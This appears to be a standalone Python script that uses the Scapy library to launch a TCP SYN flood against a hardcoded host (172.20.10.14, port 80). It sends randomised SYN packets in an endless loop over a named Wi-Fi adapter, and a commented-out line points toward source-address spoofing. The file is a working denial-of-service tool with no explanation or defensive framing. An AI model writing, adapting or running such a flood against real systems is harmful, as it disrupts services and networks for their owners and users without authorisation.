from traceback import print_stack
from scapy.all import *
import random


IFACE = "Realtek RTL8852AE WiFi 6 802.11ax PCIe Adapter"

def SYN_Flood(dstIP,dstPort,counter):

    s_port = random.randint(1000,9000)
    s_eq = random.randint(1000,9000)
    w_indow = random.randint(1000,9000)

    IP_Packet = IP ()
    # IP_Packet.src = "1.2.1.1"
    IP_Packet.dst = dstIP

    TCP_Packet = TCP ()	
    TCP_Packet.sport = s_port
    TCP_Packet.dport = dstPort
    TCP_Packet.flags = "S"
    TCP_Packet.seq = s_eq
    TCP_Packet.window = w_indow

    send(IP_Packet/TCP_Packet,loop=1,iface=IFACE, verbose=0)

SYN_Flood("172.20.10.14",80,100000)

